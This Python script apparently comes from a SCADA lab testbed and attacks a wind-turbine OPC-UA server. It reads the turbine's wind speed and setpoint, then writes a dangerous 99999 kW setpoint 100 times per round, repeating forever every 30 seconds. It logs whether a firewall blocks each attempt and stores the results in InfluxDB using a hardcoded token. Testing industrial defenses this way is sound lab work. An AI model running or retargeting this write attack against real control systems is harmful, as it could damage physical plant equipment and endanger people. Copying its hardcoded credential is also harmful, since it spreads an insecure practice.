#!/usr/bin/env python3
"""
OPC-UA Attacker - Secure Phase Testing
Tracks blocked connections and reports security metrics
"""

import os
import asyncio
import time
from asyncua import Client
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

TARGET_HOST = os.environ.get("TARGET_HOST", "opcua-server")
INFLUX_URL = os.environ.get("INFLUXDB_URL", "http://influxdb:8086")
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)

stats = {
    "total_attempts": 0,
    "successful": 0,
    "blocked": 0,
    "connection_failures": 0,
    "recon_success": 0,
    "recon_blocked": 0,
    "write_success": 0,
    "write_blocked": 0,
}


def push_metric(action, field_name, value):
    try:
        point = (
            Point("opcua")
            .tag("container", "opcua-attacker")
            .tag("action", action)
            .tag("phase", "secure")
            .field(field_name, float(value))
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"InfluxDB write error: {e}")


def push_stats():
    """Push aggregated attack statistics"""
    try:
        block_rate = 0
        if stats["total_attempts"] > 0:
            block_rate = (stats["blocked"] / stats["total_attempts"]) * 100
        
        point = (
            Point("attack_stats")
            .tag("container", "opcua-attacker")
            .tag("protocol", "opcua")
            .tag("phase", "secure")
            .field("total_attempts", stats["total_attempts"])
            .field("successful", stats["successful"])
            .field("blocked", stats["blocked"])
            .field("block_rate", block_rate)
            .field("connection_failures", stats["connection_failures"])
            .field("recon_success", stats["recon_success"])
            .field("recon_blocked", stats["recon_blocked"])
            .field("write_success", stats["write_success"])
            .field("write_blocked", stats["write_blocked"])
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
        print(f"[STATS] Attempts: {stats['total_attempts']}, Blocked: {stats['blocked']}, Rate: {block_rate:.1f}%")
    except Exception as e:
        print(f"Stats push error: {e}")


async def run_opcua_attacker():
    print("=" * 60)
    print("  OPC-UA ATTACKER - SECURE PHASE TESTING")
    print("=" * 60)
    
    url = f"opc.tcp://{TARGET_HOST}:4840/freeopcua/server/"
    print(f"[TARGET] {TARGET_HOST}:4840")
    uri = "http://scada.hcmut.edu.vn"
    
    await asyncio.sleep(5)
    
    while True:
        print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG (SECURE MODE) ---")
        
        try:
            stats["total_attempts"] += 1
            client = Client(url=url, timeout=10)
            
            start_connect = time.time()
            await client.connect()
            connect_time = (time.time() - start_connect) * 1000
            
            print(f"[OK] Kết nối thành công trong {connect_time:.2f}ms")
            
            try:
                idx = await client.get_namespace_index(uri)
                
                wind_speed_node = await client.nodes.root.get_child(
                    ["0:Objects", f"{idx}:Turbine", f"{idx}:WindSpeed"]
                )
                setpoint_node = await client.nodes.root.get_child(
                    ["0:Objects", f"{idx}:Turbine", f"{idx}:Control", f"{idx}:SetPoint"]
                )
                
                # Phase 1: Reconnaissance
                print("\n[PHASE 1] Quét dữ liệu Turbine...")
                stats["total_attempts"] += 1
                
                try:
                    start_time = time.time()
                    wind_speed = await wind_speed_node.read_value()
                    setpoint = await setpoint_node.read_value()
                    latency = (time.time() - start_time) * 1000
                    
                    stats["recon_success"] += 1
                    stats["successful"] += 1
                    print(f"[OK] Tốc độ gió: {wind_speed}, SetPoint: {setpoint} ({latency:.2f}ms)")
                    push_metric("attack_recon", "wind_speed", wind_speed)
                    push_metric("attack_recon", "setpoint", setpoint)
                    push_metric("attack_recon", "latency", latency)
                except Exception as e:
                    stats["recon_blocked"] += 1
                    stats["blocked"] += 1
                    print(f"[BLOCKED] Recon bị chặn: {e}")
                    push_metric("recon_blocked", "blocked", 1)
                
                await asyncio.sleep(2)
                
                # Phase 2: DoS Attack
                print("\n[PHASE 2] Tấn công DoS: Ghi SetPoint nguy hiểm (99999 kW) x 100 lần...")
                success_count = 0
                blocked_count = 0
                malicious_setpoint = 99999.0
                
                for i in range(100):
                    stats["total_attempts"] += 1
                    try:
                        start_time = time.time()
                        await setpoint_node.write_value(malicious_setpoint)
                        latency = (time.time() - start_time) * 1000
                        
                        success_count += 1
                        stats["write_success"] += 1
                        stats["successful"] += 1
                        push_metric("write", "latency", latency)
                        push_metric("write", "node_value", malicious_setpoint)
                        
                        await asyncio.sleep(0.05)
                    except Exception as e:
                        blocked_count += 1
                        stats["write_blocked"] += 1
                        stats["blocked"] += 1
                        push_metric("write_blocked", "blocked", 1)
                
                print(f"[RESULT] Ghi thành công: {success_count}/100, Bị chặn: {blocked_count}/100")
                
            finally:
                await client.disconnect()
            
            push_stats()
            
        except asyncio.TimeoutError:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            print("[BLOCKED] Connection timeout - Firewall blocking!")
            push_metric("blocked", "blocked", 1)
            push_stats()
            
        except ConnectionRefusedError:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            print("[BLOCKED] Connection refused - Firewall blocking!")
            push_metric("blocked", "blocked", 1)
            push_stats()
            
        except Exception as e:
            stats["connection_failures"] += 1
            stats["blocked"] += 1
            print(f"[ERROR] {e}")
            push_metric("error", "blocked", 1)
            push_stats()
        
        push_secure_stats()
        print("\n--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---")
        await asyncio.sleep(30)


def push_secure_stats():
    try:
        point = (
            Point("secure_attack")
            .tag("container", "opcua-attacker")
            .tag("protocol", "opcua")
            .field("total_attempts", stats["total_attempts"])
            .field("successful", stats["successful"])
            .field("blocked", stats["blocked"])
            .field("connection_failures", stats["connection_failures"])
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"secure_attack push error: {e}")


if __name__ == "__main__":
    asyncio.run(run_opcua_attacker())
